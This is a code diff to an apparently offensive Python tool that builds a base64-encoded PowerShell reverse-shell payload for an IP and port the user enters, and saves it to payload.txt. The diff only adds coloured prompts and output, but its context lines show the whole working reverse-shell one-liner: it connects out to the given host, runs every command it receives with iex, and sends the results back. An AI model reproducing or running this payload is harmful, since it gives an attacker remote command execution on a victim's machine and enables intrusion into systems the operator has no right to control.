@@ -4,14 +4,18 @@
 
 import sys
 import base64
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
 def help():
     print("python3 ysshellvba.py")
     print("USAGE:After input IP and PORT it will create automotic payload.txt file on same folder")
     print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
     exit()
 
-ip = input("Enter IP address: ")
-port = int(input("Enter Port number: "))
+ip = input(Fore.RED + "Enter IP Address: ")
+port = int(input(Fore.RED + "Enter Port Number: "))
 
 payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 payload = payload % (ip, port)
@@ -31,5 +35,7 @@ print_content = input("Do you want to print the content of payload.txt? (yes/no)
 if print_content.lower() == "yes":
     # Print the content of payload.txt
     with open("payload.txt", "r") as f:
-        content = f.read()
-        print(content)
+        content = f.readlines()
+        colors = [Fore.MAGENTA]
+        for idx, line in enumerate(content):
+            print(colors[idx % len(colors)] + line.strip())
